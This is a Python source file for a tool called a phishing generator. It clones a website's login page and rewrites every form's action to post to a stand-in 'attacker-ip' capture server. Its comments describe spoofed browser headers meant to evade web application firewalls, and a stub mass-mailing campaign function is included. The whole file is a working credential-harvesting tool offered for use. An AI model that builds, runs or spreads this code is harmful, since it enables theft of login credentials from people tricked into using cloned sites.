"""
DRAKBEN Social Engineering - Phishing Generator (Mithril)
Author: @drak_ben
Description: Clones websites and generates weaponized landing pages.
"""

import logging
import os
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)


class PhishingGenerator:
    """
    Mithril Engine: Web Cloner & Trap Generator.
    """

    def __init__(self, output_dir: str = "custom_tools/phishing_sites"):
        self.output_dir = output_dir
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        logger.info("Phishing Generator (Mithril) initialized")

    def clone_site(self, url: str, folder_name: str = "cloned_site") -> str:
        """
        Clone a login page and weaponize the form action.
        """
        logger.info(f"Cloning site: {url}")
        target_dir = os.path.join(self.output_dir, folder_name)
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        try:
            # OpSec: Use realistic modern User-Agent to bypass basic WAFs
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            }
            response = requests.get(url, headers=headers, timeout=10)

            if response.status_code != 200:
                logger.error(f"Failed to fetch site: {response.status_code}")
                return ""

            soup = BeautifulSoup(response.text, "html.parser")

            # Weaponize Forms: Change action to our capture server
            for form in soup.find_all("form"):
                form["action"] = "http://attacker-ip/login.php"
                form["method"] = "POST"

            # Download assets (Basic implementation)
            # In a full tool, this would recursively download CSS/JS
            self._fix_asset_links(soup, url)

            # Save HTML
            index_path = os.path.join(target_dir, "index.html")
            with open(index_path, "w", encoding="utf-8") as f:
                f.write(str(soup))

            logger.info(f"Site cloned successfully to: {index_path}")
            return index_path

        except Exception as e:
            logger.error(f"Cloning failed: {e}")
            return ""

    def _fix_asset_links(self, soup: BeautifulSoup, base_url: str):
        """Convert relative links to absolute to prevent broken styles."""
        for tag in soup.find_all(["link", "script", "img"]):
            for attr in ["href", "src"]:
                if tag.has_attr(attr):
                    link = tag[attr]
                    if link.startswith("/"):
                        tag[attr] = urljoin(base_url, link)

    def generate_campaign(self, target_list, template_name: str):
        """
        Launch a mass mailing campaign.
        """
        # Placeholder for SMTP integration
        pass
